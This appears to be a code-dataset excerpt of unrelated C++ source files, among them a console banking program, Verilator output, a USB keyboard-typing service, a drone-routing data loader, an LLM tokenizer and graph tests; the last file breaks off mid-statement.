    "#include <iostream>\n#include <string>\n#include <cstring>\n#include <conio.h>\n#include<vector>\nusing namespace std;\nint total_saving_accounts = 0;\nint total_current_accounts = 0;\nclass account\n{\n    public :\n    string name_of_account_holder;\n    string name_of_joint_account_holder;\n    long long int account_number;\n    int balance;\n    // int withdraw;\n    // int deposit;\n    string type_of_account;\n    string pin;\n    public :\n    //In case of single holder account\n    account(string accholdername,int bal,string typeofacc,string pc)\n    {\n        account_number = rand()%100000 + 1000000000;\n        name_of_account_holder = accholdername;\n        balance = bal;\n        type_of_account = typeofacc;\n        pin = pc;\n        name_of_joint_account_holder = \"No Joint Holder in this account\";\n    }\n    //In case of multiple holder account\n    account(string accholdername,string jointholdername,int bal,string typeofacc,string pc)\n    {\n        account_number = rand()%100000 + 1000000000;\n        name_of_account_holder = accholdername;\n        name_of_joint_account_holder = jointholdername;\n        balance = bal;\n        type_of_account = typeofacc;\n        pin = pc;\n    }\n};\nvector<account>accts;\n\nvoid display_details(long long int accnum)\n{\n    bool acc_exists = false;\n    for(auto it : accts)\n    {\n        if(it.account_number==accnum)\n        {\n            acc_exists = true;\n            cout<<\"\\nAccount Number : \"<<it.account_number;\n            cout<<\"\\nAccount Holder Name : \"<<it.name_of_account_holder;\n            cout<<\"\\nJoint Holder Name : \"<<it.name_of_joint_account_holder;\n            cout<<\"\\nBalance in your account : \"<<it.balance;\n            cout<<\"\\nType of Account : \"<<it.type_of_account;\n        }\n    }\n    if(acc_exists == false){\n    cout<<\"Account doesn't exists with given Account Number.\";\n    exit(0);\n    }\n}\n\nbool create_account(vector<account>&accts)\n{\n    system(\"cls\");\n    string accholder_name;\n    cout<<\"\\nENTER YOUR DETAILS HERE : \";\n    cout<<\"\\nName of Account Holder : \";\n    cin>>accholder_name;\n    string str;\n    cout<<\"\\nDo you want to have joint holder account? Type YES/NO : \";\n    cin>>str;\n    string joint_holder;\n    if(str==\"YES\")\n    {\n        cout<<\"Enter the name of Joint Holder : \";\n        cin>>joint_holder;\n    }\n    string pin;\n    cout<<\"\\nEnter the pin : \";\n    cin>>pin;\n    string typeofacc;\n    cout<<\"\\nEnter the type of account : \";\n    int choice;\n    cout<<\"1 - Savings Account\\n\";\n    cout<<\"2 - Current Account\\n\";\n    cout<<\"Enter your choice here : \";\n    cin>>choice;\n    if(choice==1)\n     typeofacc =  \"Savings\";\n    else\n     typeofacc = \"Current\";\n\n    int balance;\n    cout<<\"\\nEnter the balance you want to have initially in your account : \";\n    cin>>balance;\n\n         //========SINGLE HOLDER ACCOUNT===========//\n\n    //If it is savings account\n    if(typeofacc==\"Savings\" && str == \"YES\"){\n    account ob(accholder_name,joint_holder,balance,typeofacc,pin);\n    total_saving_accounts++;\n    accts.push_back(ob);\n    std::cout << \"\\t\\t|-----------------------------------------------|\" << \"\\n\";; \n\tstd::cout << \"\\t\\t|                                               |\" << \"\\n\"; \n\tstd::cout << \"\\t\\t|     ACCOUNT CREATED SUCCESSFULLY              |\" << \"\\n\"; \n\tstd::cout << \"\\t\\t|                                               |\" << \"\\n\"; \n\tstd::cout << \"\\t\\t|-----------------------------------------------|\" << \"\\n\";\n    display_details(ob.account_number);\n    return true;\n    }\n    //If it is current account and balance is insufficient\n    if(typeofacc==\"Current\" && balance < 10000 && str == \"YES\")\n    {\n    std::cout << \"\\t\\t|-----------------------------------------------|\" << \"\\n\";; \n\tstd::cout << \"\\t\\t|     INSUFFICIENT BALANCE                      |\" << \"\\n\"; \n\tstd::cout << \"\\t\\t|-----------------------------------------------|\" << \"\\n\";\n    return false;\n    }\n    //Current account with sufficient balance\n    else{\n    account ob(accholder_name,joint_holder,balance,typeofacc,pin);\n    accts.push_back(ob);\n    total_current_accounts++;\n    std::cout << \"\\t\\t|-----------------------------------------------|\" << \"\\n\";; \n\tstd::cout << \"\\t\\t|                                               |\" << \"\\n\"; \n\tstd::cout << \"\\t\\t|     ACCOUNT CREATED SUCCESSFULLY              |\" << \"\\n\"; \n\tstd::cout << \"\\t\\t|                                               |\" << \"\\n\"; \n\tstd::cout << \"\\t\\t|-----------------------------------------------|\" << \"\\n\";\n    display_details(ob.account_number);\n    return true;\n    }\n\n\n        //========JOINT HOLDER ACCOUNT===========//\n\n      //If it is savings account\n    if(typeofacc==\"Savings\" && str == \"NO\"){\n    account ob(accholder_name,balance,typeofacc,pin);\n    total_saving_accounts++;\n    accts.push_back(ob);\n    std::cout << \"\\t\\t|-----------------------------------------------|\" << \"\\n\";; \n\tstd::cout << \"\\t\\t|                                               |\" << \"\\n\"; \n\tstd::cout << \"\\t\\t|     ACCOUNT CREATED SUCCESSFULLY              |\" << ",
    "// Verilated -*- C++ -*-\n// DESCRIPTION: Verilator output: Design implementation internals\n// See Vtest_top.h for the primary calling header\n\n#include \"Vtest_top_regfile.h\"\n#include \"Vtest_top__Syms.h\"\n\n#include \"verilated_dpi.h\"\n\n//==========\n\nVL_CTOR_IMP(Vtest_top_regfile) {\n    // Reset internal values\n    // Reset structure values\n    _ctor_var_reset();\n}\n\nvoid Vtest_top_regfile::__Vconfigure(Vtest_top__Syms* vlSymsp, bool first) {\n    if (false && first) {}  // Prevent unused\n    this->__VlSymsp = vlSymsp;\n    if (false && this->__VlSymsp) {}  // Prevent unused\n}\n\nVtest_top_regfile::~Vtest_top_regfile() {\n}\n\nvoid Vtest_top_regfile::_initial__TOP__test_top__regfile0__1(Vtest_top__Syms* __restrict vlSymsp) {\n    VL_DEBUG_IF(VL_DBG_MSGF(\"+        Vtest_top_regfile::_initial__TOP__test_top__regfile0__1\\n\"); );\n    Vtest_top* const __restrict vlTOPp VL_ATTR_UNUSED = vlSymsp->TOPp;\n    // Body\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0U] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[1U] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[2U] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[3U] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[4U] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[5U] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[6U] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[7U] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[8U] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[9U] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0xaU] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0xbU] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0xcU] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0xdU] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0xeU] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0xfU] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0x10U] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0x11U] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0x12U] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0x13U] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0x14U] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0x15U] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0x16U] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0x17U] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0x18U] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0x19U] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0x1aU] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0x1bU] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0x1cU] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0x1dU] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0x1eU] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__regs[0x1fU] = 0U;\n    vlSymsp->TOP__test_top__regfile0.__PVT__i = 0x20U;\n}\n\nvoid Vtest_top_regfile::_ctor_var_reset() {\n    VL_DEBUG_IF(VL_DBG_MSGF(\"+        Vtest_top_regfile::_ctor_var_reset\\n\"); );\n    // Body\n    __PVT__clk_i = VL_RAND_RESET_I(1);\n    __PVT__rst_i = VL_RAND_RESET_I(1);\n    __PVT__we_i = VL_RAND_RESET_I(1);\n    __PVT__waddr_i = VL_RAND_RESET_I(5);\n    __PVT__wdata_i = VL_RAND_RESET_I(32);\n    __PVT__re1_i = VL_RAND_RESET_I(1);\n    __PVT__raddr1_i = VL_RAND_RESET_I(5);\n    __PVT__re2_i = VL_RAND_RESET_I(1);\n    __PVT__raddr2_i = VL_RAND_RESET_I(5);\n    __PVT__rdata1_o = VL_RAND_RESET_I(32);\n    __PVT__rdata2_o = VL_RAND_RESET_I(32);\n    { int __Vi0=0; for (; __Vi0<32; ++__Vi0) {\n            __PVT__regs[__Vi0] = VL_RAND_RESET_I(32);\n    }}\n    __PVT__i = VL_RAND_RESET_I(32);\n}\n",
    "#include \"UsbService.h\"\n\nnamespace services {\n\nUsbService::UsbService() \n    : keyboard(), layout(KeyboardLayout_en_US) {}\n\nvoid UsbService::setLayout(const uint8_t* newLayout) {\n    layout = newLayout;\n}\n\nvoid UsbService::begin() {\n    if (!initialized) {\n        USB.begin();\n        keyboard.begin(layout);\n        initialized = true;\n    }\n}\n\nvoid UsbService::end() {\n    keyboard.end();\n}\n\n// USB Keyboard send string\nvoid UsbService::sendString(const std::string& text) {\n    keyboard.releaseAll();\n\n    for (const char& c : text) {\n        auto sent = keyboard.write(c);\n        if (sent == 0) {\n            M5Cardputer.Display.fillScreen(TFT_BLACK);\n            M5Cardputer.Display.setCursor(10, 10);\n            M5Cardputer.Display.print(\"NOT SENT \" + c);\n            delay(3000);\n        }\n    }\n}\n\nbool UsbService::isReady() const {\n    return initialized;\n}\n\nvoid UsbService::sendChunkedString(const std::string& data, size_t chunkSize, unsigned long delayBetweenChunks) {\n    size_t totalLength = data.length();\n    size_t sentLength = 0;\n\n    while (sentLength < totalLength) {\n        size_t remainingLength = totalLength - sentLength;\n        size_t currentChunkSize = (remainingLength > chunkSize) ? chunkSize : remainingLength;\n\n        // Extract the current chunk\n        std::string chunk = data.substr(sentLength, currentChunkSize);\n\n        // Send the chunk\n        sendString(chunk);\n\n        // Delay\n        sentLength += currentChunkSize;\n        delay(delayBetweenChunks);\n    }\n}\n\n\n} // namespace services\n",
    "\ufeff#include \"Instances.h\"\r\n#include <stdexcept>\r\nusing namespace std;\r\n\r\nbool INSTANCE::loadFromFile(const string& filename)\r\n{\r\n    try {\r\n        // \u0110\u1ecdc tau.csv\r\n        ifstream file(filename + \"/tau.csv\");\r\n        if (!file.is_open()) {\r\n            throw runtime_error(\"Unable to open tau.csv file.\");\r\n        }\r\n        string line;\r\n        while (getline(file, line)) {\r\n            vector<double> row;\r\n            stringstream ss(line);\r\n            string value;\r\n            while (getline(ss, value, ',')) {\r\n                row.push_back(stod(value));\r\n            }\r\n            tau.push_back(row);\r\n        }\r\n        file.close();\r\n\r\n        // \u0110\u1ecdc tauprime.csv\r\n        ifstream file2(filename + \"/tauprime.csv\");\r\n        if (!file2.is_open()) {\r\n            throw runtime_error(\"Unable to open tauprime.csv file.\");\r\n        }\r\n        string line2;\r\n        while (getline(file2, line2)) {\r\n            vector<double> row2;\r\n            stringstream ss2(line2);\r\n            string value2;\r\n            while (getline(ss2, value2, ',')) {\r\n                row2.push_back(stod(value2));\r\n            }\r\n            tauprime.push_back(row2);\r\n        }\r\n        file2.close();\r\n\r\n        //// \u0110\u1ecdc Cprime.csv\r\n        ifstream file3(filename + \"/Cprime.csv\");\r\n        if (!file3.is_open()) {\r\n            throw runtime_error(\"Unable to open Cprime.csv file.\");\r\n        }\r\n        string line3;\r\n        while (getline(file3, line3)) {\r\n            stringstream ss3(line3);\r\n            string value3;\r\n            while (getline(ss3, value3, ',')) {\r\n                Cprime.push_back(stod(value3));\r\n            }\r\n        }\r\n        file3.close();\r\n\r\n        // \u0110\u1ecdc Nodes.csv\r\n        ifstream file4(filename + \"/nodes.csv\");\r\n        if (!file4.is_open()) {\r\n            throw runtime_error(\"Unable to open tauprime.csv file.\");\r\n        }\r\n        string line4;\r\n        while (getline(file4, line4)) {\r\n            vector<double> row4;\r\n            stringstream ss4(line4);\r\n            string value4;\r\n            while (getline(ss4, value4, ',')) {\r\n                row4.push_back(stod(value4));\r\n            }\r\n            nodes.push_back(row4);\r\n        }\r\n        file4.close();\r\n\r\n        UAVs = 1;\r\n        n = tau.size(); // n = c+2\r\n\r\n\t\tfor (int i = 1; i < n-1; i++) { \r\n\t\t\tC.push_back(i);\r\n            }\r\n\r\n        // T\u00ednh tg drone \u0111i t\u1eeb 0 \u0111\u1ebfn node i v\u00e0 quay v\u1ec1\r\n\t\tdDrones.resize(n);\r\n        for(int i= 0 ; i < n;i++)\r\n\t\t{\r\n\t\t\tdDrones[i] = tinhkc(nodes, i) *2/ nodes[0][3];\r\n\t\t}\r\n\r\n        for (int idx = Cprime.size() - 1; idx >= 0; idx--) {\r\n            if ((tauprime[0][Cprime[idx]]) > 15) {\r\n                Cprime.erase(Cprime.begin() + idx);\r\n            }\r\n        }\r\n        return true; \r\n    }\r\n\r\n    catch (const exception& e) {\r\n        cerr << \"Error: \" << e.what() << endl;\r\n        return false; \r\n    }\r\n}\r\nvoid INSTANCE::displayData()\r\n{\r\n\tcout << \"tau: \" << endl;\r\n\tfor (const auto& row : tau)\r\n\t{\r\n\t\tfor (const auto& value : row)\r\n\t\t{\r\n\t\t\tcout << value << \" \";\r\n\t\t}\r\n\t\tcout << endl;\r\n\t}\r\n\tcout << \"tauprime: \" << endl;\r\n    for (const auto& row : tauprime)\r\n    {\r\n        for (const auto& value : row)\r\n        {\r\n            cout << value << \" \";\r\n        }\r\n        cout << endl;\r\n    }\r\n\tcout << \"Cprime: \";\r\n\tfor (const auto& value : Cprime)\r\n\t{\r\n\t\tcout << value << \" \";\r\n\t}\r\n    cout << endl<< \"nodes: \" << endl;\r\n    for (const auto& row : nodes)\r\n    {\r\n        for (const auto& value : row)\r\n        {\r\n            cout << value << \" \";\r\n        }\r\n        cout << endl;\r\n    }\r\n\tcout << \"Ddrone: \";\r\n\tfor (const auto& value : dDrones)\r\n\t{\r\n\t\tcout << value << \" \";\r\n\t}\r\n\tcout << endl;\r\n\tcout << \"UAVs: \" << UAVs << endl;\r\n\tcout << \"n: \" << n << endl;\r\n}\r\n\r\ndouble tinhkc(const vector<vector<double>>& nodes, int node) {\r\n    double c = 0;\r\n    c = sqrt(pow(nodes[0][1] - nodes[node][1], 2) + pow(nodes[0][2] - nodes[node][2], 2));\r\n    return c;\r\n}\r\n\r\n",
    "#include \"tokenizer.h\"\n\nTokenizer::Tokenizer(const YALMData& data) {\n  this->bos_id = std::stoi(data.metadata.at(\"bos_token_id\").get<std::string>());\n  this->eos_id = std::stoi(data.metadata.at(\"eos_token_id\").get<std::string>());\n  // TODO: figure out edge cases:\n  // Q: should `vocab` include byte fallback tokens?\n  // Q: should `vocab` include special tokens, e.g. '<unk>', '<s>', '</s>'?\n  // TODO: avoid copy by using std::string_view\n  const Tensor& tokens_tensor = data.tensors.at(\"tokenizer.tokens\");\n  char* tokens_tensor_end = (char*)tokens_tensor.data + tokens_tensor.size;\n  for (char* ptr = (char*)tokens_tensor.data; ptr < tokens_tensor_end; ptr++) {\n    char* s = ptr;\n    while (*ptr != '\\0' && ptr < tokens_tensor_end) {\n      ptr++;\n    }\n    vocab.emplace_back(s, ptr - s);\n  }\n  for (size_t i = 0; i < vocab.size(); i++) {\n    if (vocab[i] == \"<0x00>\") {\n      byte_fallback_start = i;\n    } else if (vocab[i] == \"<|eot_id|>\" || vocab[i] == \"<|end|>\" || vocab[i] == \"<|im_end|>\") {\n      eot_id = i;\n    }\n  }\n  // init byte_pieces\n  for (size_t i = 0; i < 256; i++) {\n    byte_pieces[i] = (char)i;\n  }\n  // init vocab trie\n  for (size_t i = 0; i < vocab.size(); i++) {\n    const std::string& word = vocab[i];\n    TokenTrie* p = &vocab_trie;\n    for (char c : word) {\n      if (p->children.count(c) == 0) {\n        p->children[c] = std::make_shared<TokenTrie>();\n      }\n      p = p->children[c].get();\n    }\n    p->token_id = i;\n  }\n}\n\nstd::string Tokenizer::decode_one(int prev_token, int token) const {\n  const std::string& piece = vocab[token];\n  // if following BOS token, sentencepiece decoder strips any leading whitespace\n  if (prev_token == bos_id && piece[0] == ' ') {\n    return piece.substr(1);\n  }\n  // return byte piece for byte fallback tokens (<0x00>, <0x01>, ..., <0xFF>)\n  if (byte_fallback_start >= 0 && token >= byte_fallback_start && (token - byte_fallback_start) < 256) {\n    return byte_pieces[token - byte_fallback_start];\n  }\n  return piece;\n}\n\nstd::vector<int> Tokenizer::encode(const std::string& text, bool encode_bos) const {\n  std::vector<int> out_tokens;\n  if (encode_bos) {\n    out_tokens.push_back(bos_id);\n  }\n\n  for (size_t i = 0; i < text.size();) {\n    size_t l = 0;\n    size_t valid_l = 0;\n    const TokenTrie* p = &vocab_trie;\n    const TokenTrie* valid_p = nullptr;\n    while (i + l < text.size()) {\n      char c = text[i+l];\n      if (p->children.count(c)) {\n        p = p->children.at(c).get();\n        l += 1;\n        if (p->token_id >= 0) {\n          valid_p = p;\n          valid_l = l;\n        }\n      } else {\n        break;\n      }\n    }\n    if (!valid_p) {\n      // No substring starting from `i` matches any vocab words, use byte fallback\n      if (byte_fallback_start >= 0) {\n        out_tokens.push_back((unsigned char)text[i] + byte_fallback_start);\n      }\n      i += 1;\n    } else {\n      out_tokens.push_back(valid_p->token_id);\n      i += valid_l;\n    }\n  }\n\n  return out_tokens;\n}\n\nstd::string Tokenizer::encoding_to_debug_string(const std::vector<int>& encoding) const {\n  std::string token_encoding_debug_str = \"\";\n  for (int token_id : encoding) {\n    if (token_id == bos_id) {\n      token_encoding_debug_str += \"[<s>:\" + std::to_string(token_id) + \"]\";\n    } else if (token_id == eos_id) {\n      token_encoding_debug_str += \"[</s>:\" + std::to_string(token_id) + \"]\";\n    } else {\n      token_encoding_debug_str += \"[\" + vocab[token_id] + \":\" + std::to_string(token_id) + \"]\";\n    }\n  }\n  return token_encoding_debug_str;\n}",
    "#include \"broteforce.h\"\n\nvoid broteforce::execute() {\t\n\n\tstd::vector<rectangle> rect_inter = rectangles;\n\tstd::vector<rectangle> all_rect = rect_inter;\n\n\tstd::vector<rectangle> tmp;\n\tchar flag_1 = 0;\n\tchar flag_2 = 0;\n\tdo {\n\t\ttmp.clear();\n\t\tfloat x1, x2, x3, x4, y1, y2, y3, y4;\n\t\tCoord LD, RU;\n\t\tfor (int i = 0; i < rect_inter.size(); i++) {\n\n\t\t\tx1 = rect_inter[i].getCordLeftDown().X;\n\t\t\ty1 = rect_inter[i].getCordLeftDown().Y;\n\t\t\tx2 = rect_inter[i].getCordRightUp().X;\n\t\t\ty2 = rect_inter[i].getCordRightUp().Y;\n\t\t\t\n\t\t\tfor (int j = 0; j < rect_inter.size(); j++) {\n\t\t\t\tif (i != j) {\n\t\t\t\t\tif (rect_inter[i].areRectanglesIntersecting(rect_inter[j])) {\n\t\t\t\t\t\t\n\t\t\t\t\t\tx3 = rect_inter[j].getCordLeftDown().X;\n\t\t\t\t\t\ty3 = rect_inter[j].getCordLeftDown().Y;\n\t\t\t\t\t\tx4 = rect_inter[j].getCordRightUp().X;\n\t\t\t\t\t\ty4 = rect_inter[j].getCordRightUp().Y;\n\n\t\t\t\t\t\tLD.X = std::max(x1, x3);\n\t\t\t\t\t\tLD.Y = std::max(y1, y3);\n\t\t\t\t\t\tRU.X = std::min(x2, x4);\n\t\t\t\t\t\tRU.Y = std::min(y2, y4);\n\n\t\t\t\t\t\trectangle new_rect(LD, RU);\n\n\t\t\t\t\t\t/*\n\t\t\t\t\t\t\u00cf\u00f0\u00ee\u00e2\u00e5\u00f0\u00ea\u00e0 \u00ed\u00e0 \u00ef\u00f0\u00e8\u00f1\u00f3\u00f2\u00f1\u00f2\u00e2\u00e8\u00e5 \u00e2 \u00e4\u00e0\u00ed\u00ed\u00ee\u00e9 \u00e8\u00f2\u00e5\u00f0\u00e0\u00f6\u00e8\u00e8 \n\t\t\t\t\t\t\u00c5\u00f1\u00eb\u00e8 \u00ef\u00f0\u00e8\u00f1\u00f3\u00f2\u00f1\u00f2\u00e2\u00f3\u00e5\u00f2, \u00f2\u00ee... \u00f2\u00ee \u00ed\u00e8\u00f7\u00e5\u00e3\u00ee \u00ed\u00e5 \u00e4\u00e5\u00eb\u00e0\u00e5\u00ec\n\t\t\t\t\t\t\u00cd\u00e5 \u00ef\u00f0\u00ee\u00e8\u00f1\u00f5\u00ee\u00e4\u00e8\u00f2 \u00e4\u00ee\u00e1\u00e0\u00e2\u00eb\u00e5\u00ed\u00e8\u00ff \u00e2 \u00f1\u00eb\u00e5\u00e4\u00f3\u00fe\u00f9\u00f3\u00fe \u00e8\u00f2\u00e5\u00f0\u00e0\u00f6\u00e8\u00fe\n\t\t\t\t\t\t\u00c7\u00e0 \u00fd\u00f2\u00ee \u00ee\u00f2\u00e2\u00e5\u00f7\u00e0\u00e5\u00f2 \u00f4\u00eb\u00e0\u00e32 \n\t\t\t\t\t\t*/\n\n\t\t\t\t\t\tfor (int f = 0; f < tmp.size(); f++) {\n\t\t\t\t\t\t\tif (new_rect == tmp[f]) {\n\t\t\t\t\t\t\t\t//tmp[f].decInter();\n\t\t\t\t\t\t\t\tflag_2 = 1;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t/*\n\t\t\t\t\t\t\u00cd\u00e5 \u00e2\u00e5\u00f0\u00ed\u00ee \u00f0\u00e0\u00e1\u00ee\u00f2\u00e0\u00e5\u00f2 \u00f1\u00f7\u00e5\u00f2\u00f7\u00e8\u00ea \u00ef\u00e5\u00f0\u00e5\u00f1\u00e5\u00f7\u00e5\u00ed\u00e8\u00e9. \u00cd\u00f3\u00e6\u00ed\u00ee \u00f1\u00e4\u00e5\u00eb\u00e0\u00f2\u00fc \u00f2\u00e0\u00ea, \u00f7\u00f2\u00ee \u00e1\u00fb \u00f0\u00e0\u00e1\u00ee\u00f2\u00e0\u00eb \u00e2\u00e5\u00f0\u00ed\u00ee\n\t\t\t\t\t\t\u00cf\u00f0\u00ee\u00e2\u00e5\u00f0\u00e8\u00f2\u00fc \u00eb\u00f3\u00f7\u00f8\u00e5 \u00e4\u00e0\u00ed\u00ed\u00fb\u00e9 \u00ea\u00ee\u00e4\n\t\t\t\t\t\t*/\n\n\t\t\t\t\t\tfor (int f = 0; f < all_rect.size(); f++) {\n\t\t\t\t\t\t\tif (new_rect == all_rect[f]) {\n\t\t\t\t\t\t\t\tif (!flag_2)\n\t\t\t\t\t\t\t\t\tall_rect[f].incrInter();\n\t\t\t\t\t\t\t\tflag_1 = 1;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t/*\n\t\t\t\t\t\t\u00cd\u00f3\u00e6\u00ed\u00ee \u00e7\u00e0\u00e4\u00f3\u00ec\u00e0\u00f2\u00fc\u00f1\u00ff \u00ed\u00e0\u00e4 \u00f5\u00fd\u00f8-\u00f2\u00e0\u00e1\u00eb\u00e8\u00f6\u00e5\u00e9. \u00cd\u00f3\u00e6\u00ed\u00ee \u00ef\u00ee\u00f1\u00ec\u00ee\u00f2\u00f0\u00e5\u00f2\u00fc, \u00ec\u00ee\u00e6\u00ed\u00ee \u00eb\u00e8 \u00f5\u00f0\u00e0\u00ed\u00e8\u00f2\u00fc \u00e4\u00e0\u00ed\u00ed\u00fb\u00e5 \u00f2\u00e0\u00ec, \u00ea\u00eb\u00fe\u00f7 - \u00ef\u00f0\u00ff\u00ec\u00ee\u00f3\u00e3\u00ee\u00eb\u00fc\u00ed\u00e8\u00ea, \u00e0 \u00e4\u00e0\u00ed\u00ed\u00fb\u00e5 - \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00ef\u00e5\u00f0\u00e5\u00f1\u00e5\u00f7\u00e5\u00ed\u00e8\u00e9.\n\t\t\t\t\t\t*/\n\n\t\t\t\t\t\tif (flag_2 == 0)\n\t\t\t\t\t\t\ttmp.push_back(new_rect);\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\tflag_2 = 0;\n\n\t\t\t\t\t\tif (flag_1 == 0)\n\t\t\t\t\t\t\tall_rect.push_back(new_rect);\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\tflag_1 = 0;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tif (!tmp.empty())\n\t\t\trect_inter = tmp;\n\t} while (!tmp.empty());\n\n\tfor (int i = 0; i < all_rect.size(); i++) {\n\t\t//std::cout << all_rect[i].get_intersection() << \"\\n\";\n\t\tif (all_rect[i].get_intersection() >= k)\n\t\t\tstd::cout << all_rect[i] << \" \" << all_rect[i].get_intersection() << '\\n';\n\t}\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"core/graphs.hpp\"\n#include <iostream>\n\nvoid printDivider() { std::cout << \"\\n\" << std::string(50, '=') << \"\\n\"; }\n\nvoid testBasicNodeOperations(Graph &graph) {\n  std::cout << \"TESTING BASIC NODE OPERATIONS\\n\";\n\n  // Test node creation with different property types\n  PropertyMap node1Props = {\n      {\"name\", std::string(\"First Node\")}, {\"value\", 42}, {\"weight\", 3.14}};\n  PropertyMap node2Props = {\n      {\"name\", std::string(\"Second Node\")}, {\"value\", 100}, {\"weight\", 2.718}};\n  PropertyMap node3Props = {\n      {\"name\", std::string(\"Third Node\")}, {\"value\", 200}, {\"weight\", 1.618}};\n\n  std::cout << \"Adding nodes to the graph...\\n\";\n  NodeId node1 = GraphOps::addNode(graph, node1Props);\n  NodeId node2 = GraphOps::addNode(graph, node2Props);\n  NodeId node3 = GraphOps::addNode(graph, node3Props);\n\n  // Test node retrieval\n  std::cout << \"\\nTesting node retrieval...\\n\";\n  auto node1Data = GraphOps::getNode(graph, node1);\n  if (node1Data) {\n    std::cout << \"Found node \" << node1Data->id << \"\\n\";\n    std::cout << \"Properties:\\n\";\n    for (const auto &[key, value] : node1Data->properties) {\n      std::cout << \"  \" << key << \": \";\n      std::visit([](const auto &v) { std::cout << v; }, value);\n      std::cout << '\\n';\n    }\n  }\n\n  // Test invalid node retrieval\n  auto invalidNode = GraphOps::getNode(graph, 999);\n  if (!invalidNode) {\n    std::cout << \"\\nCorrectly couldn't find invalid node (ID: 999)\\n\";\n  }\n\n  // Test node update\n  std::cout << \"\\nTesting node property update...\\n\";\n  PropertyMap updatedProps = {{\"name\", std::string(\"Updated First Node\")},\n                              {\"value\", 50},\n                              {\"weight\", 3.141592},\n                              {\"new_property\", std::string(\"test\")}};\n\n  bool updateResult = GraphOps::updateNode(graph, node1, updatedProps);\n  std::cout << \"Node update result: \" << (updateResult ? \"success\" : \"failure\")\n            << \"\\n\";\n\n  // Verify update\n  auto updatedNode = GraphOps::getNode(graph, node1);\n  if (updatedNode) {\n    std::cout << \"Updated node properties:\\n\";\n    for (const auto &[key, value] : updatedNode->properties) {\n      std::cout << \"  \" << key << \": \";\n      std::visit([](const auto &v) { std::cout << v; }, value);\n      std::cout << '\\n';\n    }\n  }\n}\n\nvoid testEdgeOperations(Graph &graph) {\n  std::cout << \"\\nTESTING EDGE OPERATIONS\\n\";\n\n  // Get existing nodes (assuming they exist from previous operations)\n  NodeId node1 = 0;\n  NodeId node2 = 1;\n  NodeId node3 = 2;\n\n  // Test edge creation with different properties\n  PropertyMap edge1Props = {\n      {\"weight\", 1.5}, {\"type\", std::string(\"direct\")}, {\"priority\", 1}};\n  PropertyMap edge2Props = {\n      {\"weight\", 2.5}, {\"type\", std::string(\"indirect\")}, {\"priority\", 2}};\n  PropertyMap edge3Props = {\n      {\"weight\", 3.0}, {\"type\", std::string(\"bidirectional\")}, {\"priority\", 3}};\n\n  try {\n    std::cout << \"Adding edges to the graph...\\n\";\n    EdgeId edge1 =\n        GraphOps::addEdge(graph, node1, node2, 